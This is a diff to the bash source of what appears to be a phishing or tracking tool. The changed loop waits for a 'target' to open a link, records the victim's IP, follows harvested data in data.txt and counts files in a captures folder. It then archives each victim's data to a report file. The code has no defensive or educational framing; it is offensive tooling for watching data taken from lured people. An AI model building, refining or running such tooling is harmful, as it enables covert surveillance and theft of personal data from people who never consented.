@@ -60,23 +60,17 @@ checkfound() {
 printf "\n"
 printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
 local last_capture_count=0
-local target_found=0
 while true; do
     if [[ -e "ip.txt" ]]; then
         printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
         catch_ip
         rm -rf ip.txt
-        target_found=1
-    fi
-    # Continuously show new data
-    if [[ $target_found -eq 1 && -e "data.txt" ]]; then
-        printf "\n\e[1;93m--- Live Data Report ---\e[0m\n"
-        # Use tail -f to continuously follow data.txt
-        tail -f data.txt &
+        printf "\n\e[1;93m--- Live Data Report (waiting for data...) ---\e[0m\n"
+        # Show ALL data from beginning and keep following
+        tail -f -n +1 data.txt &
         TAIL_PID=$!
-        # Wait indefinitely until new ip.txt or Ctrl+C
+        # Inner loop: monitor captures and new targets
         while true; do
-            # Check for new captures (only print when count changes)
             if [[ -d "captures" ]]; then
                 local cur_count=$(ls captures/ 2>/dev/null | wc -l)
                 if [[ $cur_count -gt $last_capture_count ]]; then
@@ -84,14 +78,15 @@ while true; do
                     printf "\n\e[1;95m[\e[0m+\e[1;95m] Captures updated: %s files in captures/ folder\e[0m\n" "$cur_count"
                 fi
             fi
-            # Check if new target arrived
             if [[ -e "ip.txt" ]]; then
                 kill $TAIL_PID 2>/dev/null
-                printf "\n\e[1;92m[\e[0m+\e[1;92m] New target opened the link!\n"
+                printf "\n\e[1;92m[\e[0m+\e[1;92m] New target detected!\n"
                 catch_ip
                 rm -rf ip.txt
-                printf "\n\e[1;93m--- New Data Report ---\e[0m\n"
-                tail -f data.txt &
+                cat data.txt >> targetreport.txt 2>/dev/null
+                > data.txt
+                printf "\n\e[1;93m--- New Target Data ---\e[0m\n"
+                tail -f -n +1 data.txt &
                 TAIL_PID=$!
             fi
             sleep 1
